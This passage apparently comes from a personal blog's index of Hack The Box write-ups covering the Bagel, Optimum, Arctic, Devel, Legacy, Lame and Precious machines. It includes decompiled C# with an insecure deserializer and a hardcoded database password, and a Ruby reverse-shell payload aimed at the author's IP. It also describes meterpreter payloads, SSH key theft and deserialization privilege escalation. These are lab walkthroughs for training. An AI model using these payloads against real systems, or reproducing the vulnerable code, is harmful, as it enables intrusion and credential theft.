TypeNameHandling = (TypeNameHandling)4 }); } catch { return \u0026#34;{\\\u0026#34;Message\\\u0026#34;:\\\u0026#34;unknown\\\u0026#34;}\u0026#34;; } } } public class Bagel { private static string _ServerIp = \u0026#34;*\u0026#34;; private static int _ServerPort = 5000; private static bool _Ssl = false; private static WatsonWsServer _Server = null; private static void Main(string[] args) { InitializeServer(); StartServer(); while (true) { Thread.Sleep(1000); } } private static void InitializeServer() { //IL_0010: Unknown result type (might be due to invalid IL or missing references) //IL_001a: Expected O, but got Unknown _Server = new WatsonWsServer(_ServerIp, _ServerPort, _Ssl); _Server.AcceptInvalidCertificates = true; _Server.MessageReceived += MessageReceived; } private static async void StartServer() { await _Server.StartAsync(default(CancellationToken)); } private static void MessageReceived(object sender, MessageReceivedEventArgs args) { string json = \u0026#34;\u0026#34;; if (args.Data != null \u0026amp;\u0026amp; args.Data.Count \u0026gt; 0) { json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count); } Handler handler = new Handler(); object obj = handler.Deserialize(json); object obj2 = handler.Serialize(obj); _Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken)); } } public class Base : Orders { private int userid = 0; private string session = \u0026#34;Unauthorized\u0026#34;; public int UserId { get { return userid; } set { userid = value; } } public string Session { get { return session; } set { session = value; } } public string Time =\u0026gt; DateTime.Now.ToString(\u0026#34;h:mm:ss\u0026#34;); } public class Orders { private string order_filename; private string order_info; private File file = new File(); public object RemoveOrder { get; set; } public string WriteOrder { get { return file.WriteFile; } set { order_info = value; file.WriteFile = order_info; } } public string ReadOrder { get { return file.ReadFile; } set { order_filename = value; order_filename = order_filename.Replace(\u0026#34;/\u0026#34;, \u0026#34;\u0026#34;); order_filename = order_filename.Replace(\u0026#34;..\u0026#34;, \u0026#34;\u0026#34;); file.ReadFile = order_filename; } } } public class File { private string file_content; private string IsSuccess = null; private string directory = \u0026#34;/opt/bagel/orders/\u0026#34;; private string filename = \u0026#34;orders.txt\u0026#34;; public string ReadFile { get { return file_content; } set { filename = value; ReadContent(directory + filename); } } public string WriteFile { get { return IsSuccess; } set { WriteContent(directory + filename, value); } } public void ReadContent(string path) { try { IEnumerable\u0026lt;string\u0026gt; values = System.IO.File.ReadLines(path, Encoding.UTF8); file_content += string.Join(\u0026#34;\\n\u0026#34;, values); } catch (Exception) { file_content = \u0026#34;Order not found!\u0026#34;; } } public void WriteContent(string filename, string line) { try { System.IO.File.WriteAllText(filename, line); IsSuccess = \u0026#34;Operation successed\u0026#34;; } catch (Exception) { IsSuccess = \u0026#34;Operation failed\u0026#34;; } } } public class DB { [Obsolete(\u0026#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.\u0026#34;)] public void DB_connection() { //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_000e: Expected O, but got Unknown string text = \u0026#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K\u0026#34;; SqlConnection val = new SqlConnection(text); string text2 = \u0026#34;INSERT INTO orders (Name,Address,Count,Type) VALUES (\u0026#39;Eliot\u0026#39;,\u0026#39;Street\u0026#39;,4,\u0026#39;Baggel\u0026#39;)\u0026#34;; } } } Okay, this was the most challenging part After scrolling through code my intuition was telling me that we can exploit deserialization Found hacktricks, systemweakness and exploit-notes.hdks.org articles The hints from the HTB forum gave me confidence that I was on the right path So I started playing around with different tools recommended in the hacktricks article that could be helpful in exploiting No luck with RCE So I knew my approach was wrong maybe I started reading other articles and systemweakness article was really helpful So we know we have a function that is responsible for deserialization Now I need to find canditates according to the article And we have one in Orders class named RemoveOrder We know we can deploy LFI based on exploit-notes.hdks.org We have a File class that we can use to achieve our goals We use File\u0026rsquo;s ReadFile and set the value to the file we want to read I started crafting payload based on the examples given in articles above and succeded Thus I didn\u0026rsquo;t fully understand the whole magic behind the exploitation and didn\u0026rsquo;t have a whole picture of exploit chain in the source code I suggest you to read 0xdf\u0026rsquo;s explanation, he has a nice exploitation map of this deserialization part Since the dll is running by a different user, we could probably read their ssh keys Let\u0026rsquo;s craft the payload to read id_rsa And we get phil's key Use the connect to the box and we get a foothold User Now we saw that there is another user: developer Let\u0026rsquo;s try the password that was stored in DB class, that we saw during decompilation Root After privescing to developer The first thing I always check is sudo rights developer can execute dotnet as root Check GTFOBins And we have a root I will check other writeups to paint the whole picture of the deserialization part since I solved it blindly So please check other writeups ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bagel/images/bagel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bagel/","summary":"Bagel Enumeration nmap └─$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.","tags":["HTB","python","flask","source-code","file-read","dotnet","websocket","reverse-engineering","proc","wscat","dnspy","json","json-deserialization","dotnet-deserialization","json.net"],"title":"[HTB] Machine: Bagel"},{"categories":null,"contents":"Optimum Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.60 seconds Web server We see the version and the application running HttpFileServer 2.3 Let\u0026rsquo;s google Foothold/User Let\u0026rsquo;s copy an exploit and run I started Http server and hosted shell.ps1 And we get a shell Root Let\u0026rsquo;s start enumerating for privesc systeminfo PS C:\\Users\\kostas\\Downloads\u0026gt; systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-70000-00000-AA535 Original Install Date: 18/3/2017, 1:51:36 ?? System Boot Time: 9/6/2023, 5:55:25 ?? System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest Total Physical Memory: 4.095 MB Available Physical Memory: 3.481 MB Virtual Memory: Max Size: 5.503 MB Virtual Memory: Available: 4.932 MB Virtual Memory: In Use: 571 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: \\\\OPTIMUM Hotfix(s): 31 Hotfix(s) Installed. [01]: KB2959936 [02]: KB2896496 [03]: KB2919355 [04]: KB2920189 [05]: KB2928120 [06]: KB2931358 [07]: KB2931366 [08]: KB2933826 [09]: KB2938772 [10]: KB2949621 [11]: KB2954879 [12]: KB2958262 [13]: KB2958263 [14]: KB2961072 [15]: KB2965500 [16]: KB2966407 [17]: KB2967917 [18]: KB2971203 [19]: KB2971850 [20]: KB2973351 [21]: KB2973448 [22]: KB2975061 [23]: KB2976627 [24]: KB2977629 [25]: KB2981580 [26]: KB2987107 [27]: KB2989647 [28]: KB2998527 [29]: KB3000850 [30]: KB3003057 [31]: KB3014442 Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) 82574L Gigabit Network Connection Connection Name: Ethernet0 DHCP Enabled: No IP address(es) [01]: 10.10.10.8 Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. Sherlock.ps1 This tool is Deprecated. Have a look at Watson instead. So we can either try Watson or Sherlock I tried precompiled Watson, it didn\u0026rsquo;t work. Need to compile it myself next time So I used Sherlock PS C:\\Users\\kostas\\Downloads\u0026gt; import-module .\\sherlock.ps1 PS C:\\Users\\kostas\\Downloads\u0026gt; Find-AllVulns Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : \u0026#39;mrxdav.sys\u0026#39; WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable I also ran wesng There were a lot of CVEs So I thought maybe I should try metasploit's local exploit suggester Created msfvenom payload for meterpreter Started msfconsole and ran multi/handler Uploaded and ran msfvenom payload from the shell we got before And booted exploit suggester We see MS16-032 Which was in Sherlock's output So I tried running it before, but had luck Upon further investigation, exploit-db exploit won\u0026rsquo;t work since it spawns the new window So I tried running metasploit's version of MS16-032 exploit Check ippsec\u0026rsquo;s video or 0xdf\u0026rsquo;s writetup regaring the MS16-032, they used Empire's version of MS16-032 script ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/optimum/images/optimum.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/optimum/","summary":"Optimum Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.","tags":["HTB","httpfileserver","hfs","searchsploit","cve-2014-6287","winpeas","watson","sherlock","process-architechure","ms16-032","cve-2016-0099","metasploit"],"title":"[HTB] Machine: Optimum"},{"categories":null,"contents":"Arctic Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 148.92 seconds Only 3 ports are open Let\u0026rsquo;s check port 8500 I opened using browser After scavenging through directories, we can see interesting path We see the version and the application running After googling a bit, we can see there is a vulnerability Foothold/User So let\u0026rsquo;s try exploiting application I used CVE-2009-2265, since provides a nice description of the exploit And we get a foothold and user Root Let\u0026rsquo;s try escalating our privileges There are different ways to approach this We can use wesng Beware of the huge output from the tool Or since it\u0026rsquo;s an old box, I thought it was intended to be solved using metasploit Maybe I am wrong Download meterpreter payload generated by msfvenom And get a meterpreter shell Then we run exploit suggester We get a bunch of results Then we try running each one with a hope that we get privileged access Or you can try other kernel exploits available in this box But since it was an old box, I tried running MS10-092 I had no success (even tried doing it manually), maybe it was metasploit version problem or something else (the box was laggy and I had connection issues) You can check ippsec\u0026rsquo;s writeup, who solved it using the same vulnerability with success ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/arctic/images/arctic.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/arctic/","summary":"Arctic Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.11 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:05 BST Nmap scan report for 10.10.10.11 (10.10.10.11) Host is up (0.093s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 8500/tcp open fmtp? 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.","tags":["HTB","coldfusion","javascript","searchsploit","jsp","upload","metasploit","directory-traversal","crackstation","windows-exploit-suggester","ms10-095"],"title":"[HTB] Machine: Arctic"},{"categories":null,"contents":"Devel Enumeration Nmap ──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 | http-methods: |_ Potentially risky methods: TRACE Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds nmap reveals that Anonymous FTP login allowed and we see the content Let\u0026rsquo;s check ftp manually We see that the content is hosted by the http server Let\u0026rsquo;s see if we can upload the files to ftp And we get a webshell Foothold \u0026amp; Root So I decided to use metasploit in this case, since it has built-in exploit suggester So I have to upload meterpreter shell payload generated by msfvenom After getting access, I ran exploit suggester We can\u0026rsquo;t use first option, since it seems like it\u0026rsquo;s used when you want to elevate and bypass UAC So We use the next option Set the options, run the exploit and get NT Autority\\System I suggest checking 0xdf\u0026rsquo;s writeup He provides another approach for privesc ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/devel/images/devel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/devel/","summary":"Devel Enumeration Nmap ──(kali㉿kali)-[~] └─$ nmap -sC -sV 10.10.10.5 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 15:56 BST Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.094s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.","tags":["HTB","webshell","aspx","meterpreter","metasploit","msfvenom","ms11-046","ftp","watson","smbserver","upload"],"title":"[HTB] Machine: Devel"},{"categories":null,"contents":"Legacy Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 62.71 seconds Nmap vulnerability scripts ┌──(kali㉿kali)-[~] └─$ nmap -Pn -p139,445,135 --script *vuln* 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:17 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.11s latency). PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug) | smb-vuln-ms08-067: | VULNERABLE: | Microsoft Windows system vulnerable to remote code execution (MS08-067) | State: VULNERABLE | IDs: CVE:CVE-2008-4250 | The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, | Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary | code via a crafted RPC request that triggers the overflow during path canonicalization. | | Disclosure date: 2008-10-23 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250 |_ https://technet.microsoft.com/en-us/library/security/ms08-067.aspx | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED |_smb-vuln-ms10-054: false Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds Right away it states that it\u0026rsquo;s vulnerable to MS08-067 https://www.exploit-db.com/exploits/7104 Root Let\u0026rsquo;s run metasploit and execute an exploit I was lazy to search for a Github exploit And we have an access as LEGACY$ machine account ","date":"May 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/legacy/images/legacy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/legacy/","summary":"Legacy Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 18:11 BST Nmap scan report for 10.10.10.4 (10.10.10.4) Host is up (0.17s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m11s, deviation: 2h07m16s, median: 4d22h57m11s |_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 005056b90f40 (VMware) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2023-06-04T22:09:21+03:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) Service detection performed.","tags":["HTB","ms08-067","ms17-010","smb","msfvenom","xp"],"title":"[HTB] Machine: Legacy"},{"categories":null,"contents":"Lame Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA) |_ 2048 5656240f211ddea72bae61b1243de8f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: 2023-05-30T12:14:42-04:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 1h59m54s, deviation: 2h49m43s, median: -6s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.17 seconds Checked SMB After googling, found a vulnerable FTP version Checked SMB version Googling revealed Username map script Since I am trying not to use Metasploit, I searched for exploit and found one on github Root Let\u0026rsquo;s run exploit and get foothold Got reverse shell Let\u0026rsquo;s check user Oh, we are root ","date":"May 23, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/lame/images/lame.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/lame/","summary":"Lame Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV 10.10.10.3 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 17:14 BST Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.10s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.3 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.","tags":["HTB","ftp","vsftpd","samba","searchsploit","metasploit"],"title":"[HTB] Machine: Lame"},{"categories":null,"contents":"Precious Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.35 seconds Let\u0026rsquo;s check port 80 It\u0026rsquo;s a service that converts Web Pages to PDF Let\u0026rsquo;s supply anything and see what it returns I am running Burp Suite in the background So after supplying any url, we receive a pdf So I tried figuring out the backend service, or library that was responsible for conversion I took the response data from Burp Suite and used Cyber Chef to decode it We see the package and it\u0026rsquo;s version After a little bit of googling Let\u0026rsquo;s test it I set up tcpdump to listen to ICMP Success Let\u0026rsquo;s get a foothold Foothold I used revshells.com to create a payload for Ruby (It was revealed in Burp Suite responses and pdfkit is a Ruby package) http://10.10.16.37:8000/index.html?p=#{\u0026#39;%20`ruby -rsocket -e\u0026#39;spawn(\u0026#34;sh\u0026#34;,[:in,:out,:err]=\u0026gt;TCPSocket.new(\u0026#34;10.10.16.37\u0026#34;,6666))\u0026#39;`\u0026#39;} Try the payload And We get a reverse shell Now we need to privesc After running the linpeas.sh We see that we have another user ╔══════════╣ Users with console henry:x:1000:1000:henry,,,:/home/henry:/bin/bash root:x:0:0:root:/root:/bin/bash ruby:x:1001:1001::/home/ruby:/bin/bash User After checking the home directory of the ruby user I found henry credentials And su to henry Let\u0026rsquo;s get root Root The first thing I check is sudo privileges And we get a result Let\u0026rsquo;s check the file According to the comments, the script loads the list of dependencies from the dependencies.yaml and compares them to the ones already installed After googling We find that there is a yaml injection or https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml Check the version So let\u0026rsquo;s try Firstly, it seems like the script searches for dependencies.yaml file in the directory where we execute the command So we can create dependencies.yaml anywhere where we have the privileges to do so Copy the payload from the links above Run the command And we get our flag ","date":"May 20, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/precious/images/precious.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/precious/","summary":"Precious Enumeration Nmap ┌──(kali㉿kali)-[~] └─$ nmap -Pn -sC -sV -T4 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-16 11:09 EDT Nmap scan report for 10.10.11.189 (10.10.11.189) Host is up (0.14s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.","tags":["HTB","subdomain","ruby","phusion","passenger","nginx","exiftool","pdfkit","cve-2022-25765","command-injection","bundler","yaml-deserialization","vhosts"],"title":"[HTB] Machine: Precious"},{"categories":null,"contents":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/hackthebox/overview/images/htb.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/overview/","summary":"This section will contain HTB notes, solutions and materials. Checkout official HTB website You can also checkout ippsec\u0026rsquo;s youtube channel or website, 0xdf\u0026rsquo;s youtube channel or website More links will be added\u0026hellip; ","tags":["HTB"],"title":"[HTB] Overview"},{"categories":null,"contents":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","date":"April 22, 2023","hero":"/posts/cybersecurity/pentesting/active_directory/images/pentest.jpg","permalink":"https://umarbaevb.github.io/posts/cybersecurity/pentesting/active_directory/","summary":"This section will contain Active Directory notes and materials. The links to notes and materials will be added in future\u0026hellip; ","tags":["Active Directory"],"title":"[Pentesting] Active 